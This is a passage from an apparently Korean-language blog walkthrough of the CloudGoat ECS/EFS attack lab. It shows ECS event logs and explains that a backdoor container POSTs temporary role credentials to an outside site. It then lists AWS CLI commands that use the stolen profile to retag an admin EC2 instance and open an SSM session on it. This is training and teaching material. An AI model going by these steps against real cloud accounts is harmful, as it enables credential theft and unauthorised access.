punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"8269f6f7-6a2e-423f-b91c-0172916ffc77\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:45:08.741000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 4fcb70d2909f457e84afb72cac304ce2).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"63466e77-f89a-45b0-9c8b-18459228ad8b\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:43:56.144000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 7bad7aab42e149ccae29d102b800fb91).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"89bd690d-d4b6-404a-8f11-56e702a77545\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:42:34.555000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 9866212791fe46259ea41175d28b0b5f).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"63fbfc2d-543b-4672-a1f8-4c5cc8738402\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:41:15.754000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task dd2270d0553f48dbb9939eff17a7c19b).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"6c3bf886-388b-4f1d-ae58-7788048df246\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:39:58.741000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task fbef54ca53934164afeda71fc0881141).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"149161f7-d1a2-464f-b20b-250a86ddd757\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:38:29.878000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 0ba11ac4ec694305802aa6479f06ad4e).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"3783105d-8c9d-4077-86e0-2fc329c0b615\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:37:12.019000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 8a2e94bfa8c24bc9862c521a0150b64f).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"24696996-6762-43da-a403-111656c8ec01\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:35:44.649000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 61b732247a834251aba63eb28c3f0c38).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"a5cf180b-4490-4e1d-957b-321904e41b66\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:34:22.101000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task e19aff3b687b4975aa794d075b205d2f).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"fe83791c-0168-48c8-ba93-564e5227e3d0\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:32:52.063000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task b68f025b793947649e058d7afcfe2b57).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"b5b1ccc4-8b67-4ef3-99bb-a72b4dd80c22\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:31:19.764000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task a10f9b3b45364e23ac50401922236117).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"aeb00c7f-5805-476b-bfd1-7264d019a813\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:29:58.538000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 55923c179d6646a2bcf24238c555f917).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"5b833bd6-6ab7-42aa-b9cd-d139f2f35815\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:28:38.731000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 98762156d3cd4755810d931b06a52f6d).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"67e677cc-d821-4b6e-abe9-ca3edeabe155\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T06:27:15.719000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 82997be7cdda44e1aa3817e441341590).\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"442e3c48-67cf-4403-9169-35ead9faf92b\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T04:14:01.385000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has reached a steady state.\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"715906ed-8c68-4416-8289-155619a6474e\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T04:14:01.384000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) (deployment ecs-svc/4824857400021118616) deployment completed.\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"0eb4bc07-c02f-46bf-83f1-62154dc72c31\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T04:13:33.217000+00:00\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 777f705ec2144111ad094049dd4ea924).\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"createdAt\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T04:13:26.010000+00:00\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"placementConstraints\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"placementStrategy\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"networkConfiguration\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"awsvpcConfiguration\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"subnets\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token string\">\"subnet-00a761bd4a95363c0\"</span>\n                <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"securityGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token string\">\"sg-05636ec76dbc40c42\"</span>\n                <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"assignPublicIp\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ENABLED\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"schedulingStrategy\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"REPLICA\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"createdBy\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:user/cloudgoat\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"enableECSManagedTags\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"propagateTags\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"NONE\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"enableExecuteCommand\"</span><span class=\"token punctuation\">:</span> false\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAaUlEQVQY062PywqAIBRE7/9/YbRpUUqWjwgr6qoTuC4oceCs5gFDvfZoxIr9OBBCQIyxGGYGzcai7STGaYZzDsaYYrTWIO89BiGhlIK19lNRjjKXnzy6mLFs56+727m/5imlhJrKgzW5AUoK024sce14AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/4b041c7e711d22496a6d146d2c05d12e/37523/30.png\"\n        srcset=\"/static/4b041c7e711d22496a6d146d2c05d12e/e9ff0/30.png 180w,\n/static/4b041c7e711d22496a6d146d2c05d12e/f21e7/30.png 360w,\n/static/4b041c7e711d22496a6d146d2c05d12e/37523/30.png 720w,\n/static/4b041c7e711d22496a6d146d2c05d12e/302a4/30.png 1080w,\n/static/4b041c7e711d22496a6d146d2c05d12e/21b4d/30.png 1280w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>ECS가 새로운 백도어 컨테이너인 <code class=\"language-text\">webapp:3</code> 를 등록하면서 <code class=\"language-text\">webapp:1</code> 도 역시 계속 해서 동작중인 것을 확인할 수 있습니다.</li>\n<li>Task Definition가 Credential를 POST하게 되면 종료가 되는데 결과적으로 webapp:1은 계속 실행되는 거고 ECS는 webapp:1을 지속적으로 재배포하면서 정기적으로 Credential 정보를 보내는 역활을 하는 것 입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 51.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABS0lEQVQoz3WS25LbIBBE9f8/mafIsgXIEkJcBjgpkNZxsuuHroGCavrCEEIkpYSIUEqh5MLDr9weE7dxZLyNTNOE1ho1zxhj+v1aK7WUc75h+HWb+a1XpufOfXWMi2U/PEoZZrOwrJZ1d7gQcT6eMySODxjs7jhCIElGciYkwcXQFd3vdzZriUkoQKn1O0oll/LCcFrNXS61HTbSM4ZZKfyyEB8PotKUGCkpvZBD6PMfy1+LcuWRc8ZfhEopdrMQZkXQhvh8EtsD64aEiBweifFUl0vnGHoRF74IgyScc50wx0SW/NfyZa1Zfe3zG+EnhW3qplApZNuQ3ZEPTxGhwtnwTy1/ImzZtm+ytfxmReqkO3Ic5Jblm7N3fCOUy3LwHj3PeHdQQqS28loZVzH/K/ussOT+bdZtw2iNNQa7LHhr8ftOFOkIKRF/wB9xog3r3DCbcwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/8d2cd532ce7d70ccd63f744dadd8af55/37523/31.png\"\n        srcset=\"/static/8d2cd532ce7d70ccd63f744dadd8af55/e9ff0/31.png 180w,\n/static/8d2cd532ce7d70ccd63f744dadd8af55/f21e7/31.png 360w,\n/static/8d2cd532ce7d70ccd63f744dadd8af55/37523/31.png 720w,\n/static/8d2cd532ce7d70ccd63f744dadd8af55/302a4/31.png 1080w,\n/static/8d2cd532ce7d70ccd63f744dadd8af55/46115/31.png 1290w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>backdoor container가 페이로드를 성공적으로 동작시키고 Temp Credential 을 외부 웹사이트로 POST 요청하여 해당 Credential 정보를 탈취할 수있습니다.</li>\n<li>해당 정보를 토대로 <code class=\"language-text\">cg-ecs-role</code> 에 적용할 수 있습니다.</li>\n</ul>\n<h3 id=\"admin-ec2로-pivot\" style=\"position:relative;\"><a href=\"#admin-ec2%EB%A1%9C-pivot\" aria-label=\"admin ec2로 pivot permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Admin EC2로 Pivot</h3>\n<ul>\n<li>백도어로 전달되는 credential 정보를 profile 등록해두고 해당 Conatiner에 연결된 정책들을 확인하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws ec2 describe<span class=\"token operator\">-</span>instances <span class=\"token operator\">-</span><span class=\"token operator\">-</span>query <span class=\"token string\">'Reservations[*].Instances[*].[Tags]'</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile ecs_role_efs</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAABGklEQVQ4y51U23aDIBDEa6JyESVeYmzapO3//+H07OaQpLQPmIdxAWGcnV0UqptRmwGVGiHVAmUWGPvGkaDbFcau0O3pFu2KRh2hzInXaJxkLSPNLUSSWeRFj6qe0KgZedlDCA2RmgcS/YiJ+f0uNUxEIFJBj3Lv4IYLhumTQaR+UwwChS2KnUPn3tEfLnDjFbWc/z0UQ/6HkHxi6UG6oZJIwg82m4yWeuGx7c+sOFohkWVFx6AFmj+j3B/Y02hC2uwJfTF8as/YlLKv8jh/o+3OQcuY1z0kUFGkPt4bmz4gzfJ6ld1w5Tml7z2kuImQDvXc2F9caU/g22eTh2lmuSC7akDV3K4fjcOD0Qqlne4/B7rX1MhbFIWEPzWeOO4YA5TPAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/10f84c59ecaeefbb2edbeede1b72b20e/37523/32.png\"\n        srcset=\"/static/10f84c59ecaeefbb2edbeede1b72b20e/e9ff0/32.png 180w,\n/static/10f84c59ecaeefbb2edbeede1b72b20e/f21e7/32.png 360w,\n/static/10f84c59ecaeefbb2edbeede1b72b20e/37523/32.png 720w,\n/static/10f84c59ecaeefbb2edbeede1b72b20e/302a4/32.png 1080w,\n/static/10f84c59ecaeefbb2edbeede1b72b20e/01a87/32.png 1288w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 정책에서 <code class=\"language-text\">StartSession</code> 에서 True라는 tag를 확인할 수있으며 EC2에서 StartSession을 허용하는 것을 확인할 수 있습니다.</li>\n</ul>\n<p>AWS system manager and ec2 action</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws ec2 create<span class=\"token operator\">-</span>tags <span class=\"token operator\">-</span><span class=\"token operator\">-</span>resource i<span class=\"token operator\">-</span>0db441693a5e80703 <span class=\"token operator\">-</span><span class=\"token operator\">-</span>tags Key<span class=\"token operator\">=</span>StartSession<span class=\"token punctuation\">,</span>Value<span class=\"token operator\">=</span>true</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token string\">\"AmiLaunchIndex\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"ImageId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ami-0a313d6098716f372\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"InstanceId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"i-0db441693a5e80703\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"InstanceType\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"t2.micro\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"LaunchTime\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T04:13:12+00:00\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"Monitoring\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"State\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"disabled\"</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws ec2 create<span class=\"token operator\">-</span>tags <span class=\"token operator\">-</span><span class=\"token operator\">-</span>resource i<span class=\"token operator\">-</span>0db441693a5e80703 <span class=\"token operator\">-</span><span class=\"token operator\">-</span>tags Key<span class=\"token operator\">=</span>StartSession<span class=\"token punctuation\">,</span> Value<span class=\"token operator\">=</span>true\n\naws ssm start<span class=\"token operator\">-</span>session <span class=\"token operator\">-</span><span class=\"token operator\">-</span>target i<span class=\"token operator\">-</span>0db441693a5e80703 <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile ecs_role_efs</code></pre></div>\n<ul>\n<li>system manager는 EC2에 대한 다양한 관리 작업을 수행하고 관리형 EC2에 SSH로 연결할 수 있도록 세션을 시작할 수 있는 AWS 서비스입니다.</li>\n<li>Admin EC2의 태그 값이 False로 설정된 것을 확인했었는 이를 편집할 수 있는 권한인 <code class=\"language-text\">ruse ec2</code> 를 이용하여 Admin EC2를 수정하고 원격 세션을 시작할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAsElEQVQY042PwQ6CMBBEC+jBKLSlECgF2qIBFPXgwf//szFdE+To4WW2uzs7KSu0RWkcSBsLVXtoM6NqRpjuit7doc2Etr993/4BNzxxGV9o2hm1mSByi7xwkMqCVXrEKWuQiRYpN6RhIeUtVDlAlR5ldSbNC08mLjuqwzzsxTu5wublTWmdXehQMAdCnYluPSiVozAWc7Ao+xFzRIlYYeEbwXg4Vkj2OTW3if+w9XwAPSViDLvYIoAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/62b4bd41274b46fd827acb36d06af7f2/37523/33.png\"\n        srcset=\"/static/62b4bd41274b46fd827acb36d06af7f2/e9ff0/33.png 180w,\n/static/62b4bd41274b46fd827acb36d06af7f2/f21e7/33.png 360w,\n/static/62b4bd41274b46fd827acb36d06af7f2/37523/33.png 720w,\n/static/62b4bd41274b46fd827acb36d06af7f2/681f1/33.png 899w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"포트-스캐닝\" style=\"position:relative;\"><a href=\"#%ED%8F%AC%ED%8A%B8-%EC%8A%A4%EC%BA%90%EB%8B%9D\" aria-label=\"포트 스캐닝 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>포트 스캐닝</h3>\n<ul>\n<li>처음에 <code class=\"language-text\">ruse EC2</code> 를 사용하여 연결된 role 정보를 추출하는데 이때 <code class=\"language-text\">EFS:ClientMount</code> 라는 권한을 확인할 수 있었습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 34.44444444444444%; position: relative; bottom: 0; left: 0; background-image: 